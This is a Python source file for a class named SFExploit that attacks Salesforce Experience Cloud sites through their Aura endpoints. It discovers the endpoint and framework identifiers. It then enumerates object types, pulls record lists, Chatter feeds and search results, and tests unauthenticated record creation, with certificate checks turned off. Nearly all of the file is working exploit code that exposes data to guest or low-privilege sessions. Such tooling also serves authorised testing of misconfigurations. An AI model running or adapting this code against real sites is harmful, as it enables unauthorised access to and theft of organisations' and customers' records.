import requests
import re, json
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SFExploit:
	def __init__(self, url, uri='', token='', sid='', fwuid='', app_data=''):

		# Init parameters
		self.url = url
		self.token = token
		self.sid = sid
		self.headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0',
				'Accept':'application/json'}
		if(sid is not None):
			self.cookies = {'sid':sid}
		self.fwuid = "wrongfwuid"
		if(fwuid is not None):
			self.fwuid = fwuid
		self.app_data = "siteforce:loginApp2"
		if(app_data is not None):
			self.app_data = app_data

		# check if aura exists. If not, there is no point testing forward
		aura_endpoints = ['/s/sfsites/aura','/aura','/s/aura']
		if len(uri) > 0:
			aura_endpoints = [uri]
		
		# Init recon
		message = json.dumps({"actions":[{"id":"242;a","descriptor":"serviceComponent://ui.force.components.controllers.relatedList.RelatedListContainerDataProviderController/ACTION$getRecords","callingDescriptor":"UNKNOWN","params":{"recordId":"Topic"}}]})
		context = json.dumps({"mode":"PROD","fwuid":self.fwuid,"app":self.app_data,"loaded":{f"APPLICATION@markup://{self.app_data}":self.app_data},"dn":[],"globals":{},"uad":False})
		post_body = {'message':message,'aura.context':context,'aura.token':self.token}

		not_found = True
		for endpoint in aura_endpoints:
			try:
				post_request = requests.post(f"{url}{endpoint}", data=post_body, headers = self.headers, cookies=self.cookies, verify=False)
				response = post_request.text
				if 'aura:clientOutOfSync' in response:
					self.aura_endpoint = endpoint
					not_found = False
					break
			except:
				not_found = True
		
		if not_found:
			self.invalid = True
		else:
			self.invalid = False

			# get fwuid and app stuff
			if (self.fwuid == "wrongfwuid" or self.app_data == "siteforce:loginApp2"):
				print("ok")
				request_send = requests.get(f"{url}/s/login/",verify=False,allow_redirects=True)
				response_headers = request_send.headers.get('Link',None)
				if response_headers:
					self.find_fwuid_and_app_in_response_headers(response_headers)
				else:
					print("oh")
					request_send = requests.post(f"{self.url}{self.aura_endpoint}", headers = self.headers, cookies=self.cookies, data=post_body)
					self.find_fwuid_in_response_body(request_send.text)
				self.context = json.dumps({"mode":"PROD","fwuid":self.fwuid,"app":self.app_data,"loaded":{f"APPLICATION@markup://{self.app_data}":self.app_data},"dn":[],"globals":{},"uad":False})
		
	def find_fwuid_and_app_in_response_headers(self, headers):
		response_headers = urllib.parse.unquote(headers)
		fwuid_pattern = "javascript\/(.*?)\/aura_prod"
		app_pattern = "\"app\":\"(.*?)\""
		self.fwuid = re.search(fwuid_pattern, response_headers).group(1)
		self.app_data = re.search(app_pattern, response_headers).group(1)


	def find_fwuid_in_response_body(self, response_data):
		fwuid_pattern = "Expected:(.*?) Actual"
		self.fwuid = re.search(fwuid_pattern, response_data).group(1).strip()

	def get_fwuid(self):
		return self.fwuid
	
	def get_app(self):
		return self.app_data
	
	def get_objects(self):
		message = json.dumps({"actions":[{"id":"1;a","descriptor":"aura://HostConfigController/ACTION$getConfigData","callingDescriptor":"UHNKNOWN","params":{}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		try:
			send_request = requests.post(url=f"{self.url}{self.aura_endpoint}",
										headers = self.headers, data=post_body, cookies=self.cookies, verify=False).json()
		except:
			return None
		objects = list(send_request['actions'][0]['returnValue']['apiNamesToKeyPrefixes'].keys())
		return objects
	
	def get_object_items(self, object_name):
		message = json.dumps({"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":object_name,"layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":False,"getCount":True,"enableRowActions":False}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		try:
			send_request = requests.post(f"{self.url}{self.aura_endpoint}",
									headers = self.headers, data=post_body, cookies=self.cookies, verify=False).json()
		except:
			return None
		if send_request['actions'][0]['state'] == 'SUCCESS':
			try:
				if 'totalCount' in send_request['actions'][0]['returnValue']:
					if send_request['actions'][0]['returnValue']['totalCount'] > 1:
						# more than 1 data exist in records which is problematic.
						return send_request['actions'][0]['returnValue']
					else:
						return None
				else:
					return None
			except:
				return None
		else:
			return None

		
	def get_collab_feeds(self, record_id):
		message = json.dumps({"actions":[{"descriptor":"serviceComponent://ui.chatter.components.aura.components.forceChatter.chatter.FeedController/ACTION$getModel","callingDescriptor":"UNKNOWN","params":{"type":"record","subjectId":record_id,"showFeedItemActions":False,"feedDesign":"DEFAULT","hasFeedSwitcher":False,"modelKey":"templates","showFilteringMenuGroup":False,"includeRecordActivitiesInFeed":False,"retrieveOnlyTopLevelThreadedComments":True}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		send_request = requests.post(f"{self.url}{self.aura_endpoint}",
									headers = self.headers, data=post_body, cookies=self.cookies, verify=False).json()
		if send_request['actions'][0]['state'] == 'SUCCESS':
			if 'config' in send_request['actions'][0]['returnValue']:
				if 'feedElementCollection' in send_request['actions'][0]['returnValue']:
					return send_request['actions'][0]['returnValue']['feedElementCollection']
				else:
					return None
			else:
				return None
		else:
			error_message = f"{send_request['actions'][0]['error']}"
			print(f">>> GOT ERROR for {record_id}: {error_message}")
			return None
		
	def search_object(self, object_name):
		message = json.dumps({"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.search.components.forcesearch.scopedresultsdataprovider.ScopedResultsDataProviderController/ACTION$getLookupItems","callingDescriptor":"UNKNOWN","params":{"scope":object_name,"term":"Ae","pageSize":10,"currentPage":1,"enableRowActions":False,"additionalFields":[],"useADS":False}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		send_request = requests.post(f"{self.url}{self.aura_endpoint}",
									headers = self.headers, data=post_body, cookies=self.cookies, verify=False).json()
		if send_request['actions'][0]['state'] == 'SUCCESS':
			if 'totalSize' in send_request['actions'][0]['returnValue']:
				if send_request['actions'][0]['returnValue']['totalSize'] > 0:
					return send_request['actions'][0]['result']
				else:
					return None
			else:
				return None
		else:
			print(f"ERROR FOR {object_name} : {send_request['actions'][0]['error']}")
			return None
		
	def attempt_record_create(self, object_name):
		message = json.dumps({"actions":[{"id":"123;a","descriptor":"aura://RecordUiController/ACTION$createRecord","callingDescriptor":"UNKNOWN","params":{"recordInput":{"apiName":object_name,"fields":{}}}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		try:
			send_request = requests.post(f"{self.url}{self.aura_endpoint}",
									headers = self.headers, data=post_body, cookies=self.cookies, verify=False).json()
		except: 
			return False
		if send_request['actions'][0]['state'] == 'SUCCESS':
			return True
		else:
			# what kind of error (403 or 400)
			try:
				error_code = send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']['statusCode']
				error_code_message = send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data'].get('errorCode',None)
				if error_code == 400:
					if 'enhancedErrorType' in send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']:
						if send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']['enhancedErrorType'] == 'RecordError':
							if 'fieldErrors' in send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']['output']:
								required_fields = ",".join(list(send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']['output']['fieldErrors'].keys()))
								return True
					if error_code_message == 'INVALID_TYPE':
						return False
				else:
					return False
			except:
				return False